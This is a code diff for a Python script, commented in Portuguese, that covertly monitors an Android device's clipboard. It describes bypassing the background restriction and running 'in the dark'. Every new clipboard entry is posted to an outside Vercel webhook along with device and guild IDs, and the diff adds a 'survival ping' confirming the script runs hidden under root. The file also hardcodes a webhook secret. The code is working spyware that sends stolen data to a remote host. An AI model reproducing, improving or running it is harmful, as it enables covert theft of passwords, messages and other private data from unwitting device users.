@@ -4,6 +4,7 @@ import subprocess
 import requests
 
 if len(sys.argv) < 3:
+    print("❌ [LOG] Faltando IDs no comando de inicialização.")
     sys.exit(1)
 
 device_id = sys.argv[1]
@@ -11,6 +12,24 @@ guild_id = sys.argv[2]
 
 URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
 AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
+
+headers = {
+    "Content-Type": "application/json",
+    "Authorization": AUTH_SECRET
+}
+
+# 🔥 PING DE SOBREVIVÊNCIA: Avisa a Vercel que o Root não matou o script!
+try:
+    print("🚀 [LOG] Iniciando auto-copy em Root...") 
+    payload_start = {
+        "texto": "🚀 [SISTEMA] Auto-Copy Sobreviveu ao Root e está rodando no escuro!", 
+        "device_id": device_id, 
+        "guild_id": guild_id
+    }
+    resp = requests.post(URL_WEBHOOK, json=payload_start, headers=headers, timeout=5)
+    print(f"📡 [LOG] Ping de sobrevivência enviado. Status Vercel: {resp.status_code}")
+except Exception as e:
+    print(f"❌ [LOG] Erro no ping inicial: {e}")
 
 def get_clipboard_binder():
     """Lê a memória bruta do Android, bypassando a trava de segundo plano"""
@@ -53,6 +72,7 @@ def get_clipboard_binder():
         return ""
 
 last_clipboard = get_clipboard_binder()
+print(f"📋 [LOG] Último texto detectado na memória ao iniciar: '{last_clipboard}'")
 
 # Loop fantasma
 while True:
@@ -60,22 +80,21 @@ while True:
         current_clipboard = get_clipboard_binder()
         
         if current_clipboard and current_clipboard != last_clipboard:
+            print(f"📝 [LOG] Novo texto copiado: '{current_clipboard}'")
+            
             payload = {
                 "texto": current_clipboard,
                 "device_id": device_id,
                 "guild_id": guild_id
             }
-            headers = {
-                "Content-Type": "application/json",
-                "Authorization": AUTH_SECRET
-            }
             
             resp = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=5)
+            print(f"📡 [LOG] Status do envio: {resp.status_code}")
             
             if resp.status_code == 200:
                 last_clipboard = current_clipboard
-    except:
-        pass
+    except Exception as e:
+        print(f"❌ [LOG] Erro no loop fantasma: {e}")
         
     # Checagem ultrarrápida no escuro
     time.sleep(1.5)
